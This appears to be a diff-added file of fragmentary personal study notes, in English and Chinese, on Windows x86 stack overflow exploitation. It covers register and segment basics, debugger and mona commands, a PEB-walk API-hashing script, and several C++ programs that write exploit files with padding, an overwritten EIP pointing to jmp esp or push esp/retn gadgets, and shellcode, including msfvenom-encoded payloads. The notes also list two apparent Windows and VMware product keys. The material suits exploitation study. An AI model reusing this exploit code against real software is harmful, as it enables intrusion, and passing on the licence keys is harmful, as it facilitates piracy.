@@ -1,0 +1,698 @@
+Integer-Overflow-to-Buffer-Overflow (IO2BO)
+
+
+
+ReLU function
+
+Libdft [32], Triton [2], and DFSan [5]
+
+fsm
+
+ Finite State Machine
+
+ASLR Address Space Layout Randomization 
+
+NX Never Execute 
+
+XD Execute Disable
+
+IA32/64 Intel architecture 32 bit /64 bit
+
+VM Virtual Memory
+
+VMS Virtual Memory Space
+
+PIC Position Independent Code
+
+PAE Physical Address Extension 
+
+OS Operating System
+
+RAM Random Access Memory
+
+GB Gigabyte 
+
+ELF Executable Linking Format
+
+AST Abstract Syntax Tree
+
+PDG Program Dependency Graph
+
+PSW Program Status Word
+
+CFG Control Flow Graph
+
+POC Proof of Concepts
+
+
+
+pointer dereference, array write, and dangerous
+
+function
+
+
+
+ CPG
+
+code property graph
+
+
+
+interprocedural sanitization graph
+
+(IPSG) and declaration-spread-sink graph (DSSG) to CPG to
+
+form the extended code property graph (ECPG)
+
+
+
+Nearest Neighbors (KNN),
+
+Decision Tree (DT), Naive Bayes (NB), AdaBoost, and
+
+Support Vector Machines (SVM)
+
+
+
+flawfinder
+
+lexical analysis
+
+https://www.cgsecurity.org/exploit/heaptut.txt
+
+In order to prevent ClamAV from
+
+crashing on the next free(), one can overwrite the .got address of
+
+free() and wait.
+
+
+
+The addresses of the constructors and destructors each stored in a different section in our ELF executable. for the constructors there
+
+is a section called '.CTORS' and for the destructors there is the '.DTORS' section. 
+
+
+
+heap-based buffer-overflow
+
+? Must overwrite memory management information
+
+将 size_t 强转为 int 类型使用，导致检查绕过，最终实现向前越界写
+
+
+
+确定并分析Fuzz目标。
+
+初步运行Fuzz工具保证能够正常开始Fuzz。
+
+收集大量初始用例并对初始用例去重。
+
+用去重后的初始用例开始Fuzz。
+
+在Fuzz过程中当代码覆盖率长时间没有增长时，人工介入分析代码覆盖率，想办法提升代码覆盖率。
+
+对发现的Crash去重。
+
+
+
+Windows exp
+
+little-endian
+
+• The mod field combines with the r/m field to form 32 possible values: eight registers and 24 addressing modes. • The reg/opcode field specifies either a register number or three more bits of opcode information. The purpose of the reg/opcode field is specified in the primary opcode. 
+
+• The r/m field can specify a register as an operand or it can be combined with the mod field to encode an addressing mode. Sometimes, certain combinations of the mod field and the r/m field is used to express opcode information for some instructions.
+
+• The scale field specifies the scale factor. 
+
+• The index field specifies the register number of the index register. (squeue ac…01
+
+• The base field specifies the register number of the base register
+
+
+
+The default segment register is SS for the effective addresses containing a BP index, DS for other effective addresses
+
+顺序
+
+* EAX, Accumulator Register
+
+* ECX, Counter Register
+
+* EDX, Data Register
+
+* EBX, Base Register
+
+* ESP, Stack Pointer
+
+* EBP, Base Pointer
+
+* ESI, Source Index
+
+* EDI, Destination Index
+
+* EIP, Instruction Pointer
+
+bypass dep需要
+
+
+
+段选择规则
+
+ 
+
+Cs段（逻辑地址，也是eip寄存器指向的内容）存储执行指令（cpu从此段获取指令
+
+code segment, where the instructions being executed are stored. The processor fetches instructions from the code segment, using a logical address that consists of the segment selector in the CS register and the contents of the EIP register.
+
+
+
+Ss段存储参数
+
+The SS register contains the segment selector for the stack segment, where the procedure stack is stored for the program, task, or handler currently being executed.
+
+
+
+ollydbg
+
+Just in time mode 
+
+ 
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbbbb
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+丟入 48 個字母 A
+
+變數 buffer 放在 EBP+28 的位址，也就是為 buffer 預留了 28 (16 進位) 的空間，也就是 40 個位元組，這空間不包含 EBP 本身，需要ebp+4覆盖到eip
+
+PC 上 Windows 是 little-endian
+
+buffer_overflow 的最後一個位元組是 NULL 字元 \x00，這代表我們不可能增加其他的字元在其後面。
+
+截断
+
+Repeat the process to identify the bad characters. 2. Why are these characters not allowed? How do these bad hex characters translate to ASCII?
+
+ 54 c3  ->PUSH ESP # RETN 指令
+
+
+
+
+
+77be0000 77c38000   C:\WINDOWS\system32\msvcrt.dll
+
+ s 77be0000 77c38000 54 c3
+
+77c21025
+
+\x25\x10\xc2\x77
+
+#include <string>
+
+#include <sstream>
+
+#include <cstdlib>
+
+using namespace std;
+
+
+
+int main(int argc, char **argv) {
+
+    string simplec001(argv[1]);
+
+    string junk(40,'A');
+
+    string ebp(4, 'B');
+
+    string eip("\x25\x10\xc2\x77");// msvcrt.dll 77c21025, push esp # retn
+
+    string instructions("\xcc\xcc\xcc\xcc");
+
+    ostringstream sout;
+
+    sout << '\"' << simplec001 << "\" " << junk
+
+         << ebp << eip << instructions;
+
+    system(sout.str().c_str());
+
+    system("pause");
+
+}
+
+
+
+environment impact(Chinese or English version
+
+set pivot
+
+MOV EAX,0x77777777
+
+MOV ECX,0x77376589
+
+XOR EAX,ECX
+
+JMP EAX
+
+
+
+Ds segment
+
+shellcode
+
+00403000  48 65 6C 6C 6F 2C 20 57  Hello, W
+
+00403008  6F 72 6C 64 21 0A 00 00  orld!...
+
+
+
+little-endian
+
+PUSH 0x00000A21
+
+PUSH 0x646C726F
+
+PUSH 0x57202C6F
+
+PUSH 0x6C6C6548
+
+PUSH ESP
+
+#include <cstdio>
+
+using namespace std;
+
+
+
+char shellcode [] =
+
+"\x68\x21\x0A\x00\x00" // push dword 0xa21
+
+"\x68\x6F\x72\x6C\x64" // push dword 0x646c726f
+
+"\x68\x6F\x2C\x20\x57" // push dword 0x57202c6f
+
+"\x68\x48\x65\x6C\x6C" // push dword 0x6c6c6548
+
+"\x54"                 // push esp
+
+"\xB9\x6A\x18\xC4\x77" // mov ecx,0x77c4186a (modify this value)
+
+DS:[00405100]=77C1186A (msvcrt.printf)
+
+Local call from 004012C1
+
+"\xFF\xD1"             // call ecx
+
+"\x31\xC0"             // xor eax,eax
+
+"\x50"                 // push eax
+
+"\xB9\x7E\x9E\xC3\x77" // mov ecx,0x77c39e7e (modify this value)
+
+DS:[004050EC]=77C09E7E (msvcrt.exit)
+
+Local call from 004012CD
+
+"\xFF\xD1"             // call ecx
+
+;
+
+
+
+修改后shellcode
+
+"\x68\x21\x0a\x00\x00" "\x68\x6f\x72\x6c\x64" "\x68\x6f\x2c\x20\x57" "\x68\x48\x65\x6c\x6c" "\x54" "\xc7\xc1\x6a\x18\xc1\x77" "\xff\xd1" "\x33\xc0" "\x50" "\xc7\xc1\x7e\x9e\xc0\x77" "\xff\xd1"
+
+
+
+typedef void (*FUNCPTR)();
+
+int main() {
+
+    printf("<< Shellcode 開始執行 >>\n");
+
+
+
+    FUNCPTR fp = (FUNCPTR)shellcode;
+
+    fp();
+
+
+
+    printf("(你看不到這一行，因為 shellcode 執行 exit() 離開程式了)");
+
+}
+
+Project 属性勾选
+
+解决问题如下：
+
+•預先假設程式的執行環境是 Windows 的 cmd.exe 命令列模式 (Console 模式)
+
+•含有 NULL 字元 (\x00 字元)
+
+•使用了絕對記憶體位址 77C4186A (msvcrt.printf) 和 77C39E7E (msvcrt.exit)
+
+•預先假設了函式 printf 和 exit 一定可以被呼叫到，也就是預先假設 msvcrt.dll 一定被載入到記憶體中
+
+ msvcrt.dll 被載入到記憶體位址不同而改變
+
+
+
+/*
+
+run.c - a small skeleton program to run shellcode
+
+*/
+
+// bytecode here
+
+char code[] = "my shellcode here";
+
+
+
+int main(int argc, char **argv) {
+
+  int (*func)();             // function pointer
+
+  func = (int (*)()) code;   // func points to our shellcode
+
+  (int)(*func)();            // execute a function code[]
+
+  // if our program returned 0 instead of 1, 
+
+  // so our shellcode worked
+
+  return 1;
+
+}
+
+Vm 16 序列号
+
+ZF3R0-FHED2-M80TY-8QYGC-NPKYF
+
+Winxp sp2 序列号
+
+HCQ9D-TVCWX-X9QRG-J4B2Y-GR2TT
+
+control-flow bending techniques
+
+取得 kernel32.dll 的基底，再取得 LoadLibraryA 的位址，然後我們使用 LoadLibraryA 將 msvcrt.dll 載入，再取得 printf 和 exit 的位址
+
+
+
+0:000> !load wow64exts
+
+0:000> !wow64exts.sw
+
+切换为32位
+
+没有成功加载符号，手动加载注意路径
+
+C:\symbol\ntdll.pdb\1751003260CA42598C0FB326585000ED2\ntdll.pdb
+
+0:000> !sym noisy
+
+noisy mode - symbol prompts on
+
+0:000> .reload 
+
+Reloading current modules
+
+00341ea0 + 1c = 00341ebc，這就是 InInitializationOrderModuleList 的位址，其結構是 _LIST_ENTRY (我們剛剛說的雙向鏈結串列)
+
+https://github.com/wine-mirror/wine/blob/master/include/winternl.h
+
+Winternl.h
+
+typedef struct _LDR_DATA_TABLE_ENTRY
+
+{
+
+    LIST_ENTRY          InLoadOrderLinks;
+
+    LIST_ENTRY          InMemoryOrderLinks;
+
+    LIST_ENTRY          InInitializationOrderLinks;
+
+    void*               DllBase;
+
+    void*               EntryPoint;
+
+    ULONG               SizeOfImage;
+
+    UNICODE_STRING      FullDllName;
+
+UNICODE_STRING      BaseDllName;
+
+typedef struct _UNICODE_STRING {
+
+  USHORT Length;        /* bytes */
+
+  USHORT MaximumLength; /* bytes */
+
+  PWSTR  Buffer;
+
+} UNICODE_STRING, *PUNICODE_STRING;
+
+"ntdll.dll"
+
+   +0x000 Length           : 0x12
+
+   +0x002 MaximumLength    : 0x14
+
+   +0x004 Buffer           : 0x7c942158  "ntdll.dll"
+
+From TEB to BaseDllName
+
+ 
+
+# Helper function for rotate-right on 32-bit architectures
+
+def ror(number, bits):
+
+    return ((number >> bits) | (number << (32 - bits))) & 0xffffffff
+
+ 
+
+# Define hashing algorithm
+
+def get_hash(data):
+
+    # Initialize hash to 0
+
+    result = 0
+
+    # Loop each character
+
+    for b in data:
+
+        # Make character uppercase if needed
+
+        if b < ord('a'):
+
+            b -= 0x20
+
+        # Rotate DllHash right by 0x0D bits (13
+
+        result = ror(result, 0x0D)
+
+        # Add character to DllHash
+
+        result = (result + b) & 0xffffffff
+
+    return result
+
+
+
+# Define a NULL-terminated base DLL name
+
+name = 'KERNEL32.DLL\0'
+
+# Encode it as Unicode(utf 16)
+
+encoded = name.encode('UTF-16-LE')
+
+# Compute the hash
+
+value = hex(get_hash(encoded))
+
+# And print it ('0x92af16da')
+
+print(value)
+
+From LDR_DATA_TABLE_ENTRY to IMAGE_EXPORT_DIRECTORY.
+
+ 
+
+Process inject(CWE-1288
+
+Cwe823
+
+ if all hashes fail to match(eg.out-of-bounds read
+
+occur resulting in an invalid pointer being de-referenced.  
+
+PushMode = 1 该标志改变了字符串的压入方式，使调试工具无法识别出字符串
+
+RetCall = 1 该标志改变API调用方式
+
+HashApi = 1 该标志开启后将由自己实现API地址的搜索，且API名称使用HASH值
+
+
+
+Cld
+
+clear-direction-flag
+
+ 
+
+
+
+!mona jmp -r
+
+jmp -r esp
+
+0x7c86467b : jmp esp |  {PAGE_EXECUTE_READ} [kernel32.dll]
+
+#include <iostream>
+
+#include <fstream>
+
+#include <string>
+
+using namespace std;
+
+   
+
+#define FILENAME "Vulnerable001_Exploit.txt"
+
+   
+
+int main() {
+
+    string junk(140,'A');
+
+    string eip("\x7b\x46\x86\x7c"); // 7c86467b, litten-endian
+
+    string shellcode("\xcc\xcc\xcc\xcc"); // shellcode
+
+   
+
+    ofstream fout(FILENAME, ios::binary);
+
+    fout << junk << eip << shellcode;
+
+   
+
+    cout << "攻擊檔案: " << FILENAME << " 輸出完成\n";
+
+} 
+
+!mona compare -f c:\1\1.bin（for debug
+
+C:\Documents and Settings\iiii\My Documents
+
+Msf
+
+msfvenom -p windows/messagebox ICON=WARNING TEXT=Hello there TITLE=General Kenobi: -b '\x0c\x0d\x20\x1a\x00\x0a\x0b\' 
+
+-f c -a x86
+
+
+
+#include <iostream>
+
+#include <fstream>
+
+#include <string>
+
+using namespace std;
+
+   
+
+#define FILENAME "Vulnerable001_Exploit.txt"
+
+   
+
+char code[] =
+
+"\xbd\x7b\xe6\x3a\xb6\xda\xc2\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
+
+"\x44\x83\xc0\x04\x31\x68\x0e\x03\x13\xe8\xd8\x43\x3a\x1f\x87"
+
+"\x75\xc8\xc4\x4c\xb4\xe2\xb7\xda\x86\xcb\xdc\xaf\x98\xfb\x97"
+
+"\xc6\x56\x70\xd1\x3a\xec\xc0\x16\xc8\x8c\xec\xad\xf8\x48\xa3"
+
+"\xa9\x71\x5a\x62\xcb\xa8\x63\x75\xab\xc1\xf0\x51\x08\x5d\x4d"
+
+"\xa5\xdb\x35\x66\xad\xda\x5f\xfd\x07\xc5\x14\x58\xb7\xf4\xc1"
+
+"\xbe\x83\xbf\x9e\x75\x60\x3e\x4f\x44\x89\x70\x4f\x5b\xd9\xf7"
+
+"\x8f\xd0\x26\x39\xc0\x14\x29\x7e\x34\xd2\x12\xfc\xef\x33\x11"
+
+"\x1d\x64\x19\xfd\xdc\x90\xf8\x76\xd2\x2d\x8e\xd2\xf7\xb0\x7b"
+
+"\x69\x03\x38\x7a\x85\x85\x7a\x59\x49\xf7\x41\x13\x79\xde\x91"
+
+"\xdd\x9c\xa9\xd8\xb6\xd0\xe4\xd2\xaa\xbe\x10\x75\xcd\xc1\x1e"
+
+"\x03\x77\x39\x5a\x6a\xa0\xa3\xef\x14\x4c\x07\x42\xf3\xe3\xb8"
+
+"\x9d\xfc\x75\x03\x6a\x6b\xea\xe7\x4a\x2a\x9a\xc4\xb8\x82\x3e"
+
+"\x42\xc8\xa9\xdb\xe0\x02\x95\xac\x58\x47\x23\x24\x86\xd1\xcc"
+
+"\x63\x42\x57\xf0\xdc\xf1\xcf\x57\x91\xb9\x97\x84\x0e\x93\x7f"
+
+"\xeb\xb1\xec\x7f\x7c\x27\x4a\xa0\x5d\xdf\x0f\xce\xf2\x7d\xa7"
+
+"\x7c\x6c\xee\x7c\xe9\x29\x8b\xec\x8c\x84\x88\x78\x12\xc3\x23"
+
+"\xf1\x48\x63\x4e\x64\xd7\x54\xc6\x09\x93\xfc\x73\xbd\x13\x98"
+
+"\x17\x51\x95\xab\x60\xe5\xf1\x21\xf8\x14\xc8\xe7\x90\xe6\x78"
+
+"\x59\x37\xf9\xaf\x68\x77\x55\xaf\xde\x7f";
+
+int main() {
+
+    string junk(140,'A');
+
+string eip("\x7b\x46\x86\x7c"); // 7c86467b, litten-endian
+
+//string debug("\xcc\xcc\xcc\xcc"); // for debugging shellcode
+
+string nops(8, '\x90'); // 讓 shikata_ga_nai 的解碼器開心地正常運作
+
+    string shellcode(code); // shellcode
+
+   
+
+    ofstream fout(FILENAME, ios::binary);
+
+   // fout << junk << eip << debug << nops << shellcode;
+
+    fout << junk << eip << nops << shellcode;
+
+    cout << "攻擊檔案: " << FILENAME << " 輸出完成\n";
+
+} 
+
+NOP 指令是讓 CPU 空轉一個運算單位時間，並不會作任何事，所以很適合用來「填空」，讓 shellcode 離堆疊頭不要這麼近，我通常使用 shikata_ga_nai 的時候會填 8 個位元左右的空間(sometimes16个
+
+
+
+msfvenom -a x86 --platform windows -p windows/exec CMD='calc.exe' -b '\x00\x09\x0a\x0d\x1a\x20' -f c
+
